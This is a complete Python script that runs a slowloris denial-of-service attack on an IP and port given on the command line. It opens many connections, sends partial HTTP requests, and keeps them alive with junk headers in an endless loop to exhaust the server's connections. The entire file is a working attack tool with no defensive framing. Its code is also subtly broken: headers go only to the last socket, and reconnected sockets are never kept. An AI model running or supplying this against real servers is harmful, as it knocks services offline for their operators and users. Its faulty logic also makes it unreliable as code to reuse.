#Does a slow loris attack against the specified ip and port.
#ip port sockets

import socket
import sys
import time
import random

log_level = 2

ip = sys.argv[1]
if len(sys.argv) <= 2:
	port = 80
else:
	port = int(sys.argv[2])
if len(sys.argv) <= 3:
	socket_count = 50
else:
	socket_count = int(sys.argv[3])

def log(text, level=1):
	if log_level >= level:
		print(text)

list_of_sockets = []

regular_headers = ["User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0", "Accept-language: en-US,en,q=0.5"] #TODO: Find out what this means

log("Attacking {} on port {} with {} sockets.".format(ip, port, socket_count))

log("Creating sockets...")
for x in range(socket_count):
	try:
		if x < 10 or x % 10 == 0:
			log("Creating socket #{}".format(x), level=2)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(4)
		s.connect((ip, port))
	except socket.error:
		log("!!ERROR: Couldn't create a socket!")
		break
	list_of_sockets.append(s)

log("Setting up the sockets...")
for s in list_of_sockets:
	s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")) #TODO: figure out what this means
for header in regular_headers:
	s.send(bytes("{}\r\n".format(header).encode("utf-8")))
	
send_times = 0
while True:
	send_times += 1
	log("Sending keep-alive headers for the #{} time...".format(send_times))
	for s in list_of_sockets:
		try:
			s.send("X-a: {}\r\n".format(random.randint(0, 2000)).encode("utf-8"))
		except socket.error:
			list_of_sockets.remove(s)
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(4)
				s.connect((ip, port))
				for s in list_of_sockets:
					s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
					for header in regular_headers:
						s.send(bytes("{}\r\n".format(header).encode("utf-8")))
			except socket.error:
				continue
	time.sleep(15) #wait 15 seconds before trying again